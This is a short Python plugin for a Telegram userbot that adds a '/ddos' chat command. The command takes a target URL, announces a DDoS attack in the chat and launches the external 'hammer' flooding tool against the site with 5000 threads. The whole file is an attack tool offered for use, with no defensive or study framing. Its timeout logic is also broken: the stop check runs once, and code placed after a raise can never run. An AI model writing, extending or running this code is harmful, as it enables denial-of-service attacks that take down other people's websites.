import sys
import os
import time
import socket
import random
from userbot.events import register
import subprocess

@register(outgoing=True, pattern="/ddos (.*)")
async def ddos(event): 
  url = event.pattern_match.group(1)
  cmnd = f"{url}"
  await event.edit(f"Starting DDOS attack on site `{url}`\n\nThis attack will automatically stop after 10 mins")
  print("starting attack")
  timeout = 600
  timeout_start = time.time()
  if time.time() < timeout_start + timeout:
     subprocess.run(["python", "hammer", "-s", cmnd, "-t", "5000"])
  elif time.time() >= timeout_start + timeout:
     raise KeyboardInterrupt
     await event.edit(f"Attacked has stopped now\nIf {url} still isn't down then run the same command again")
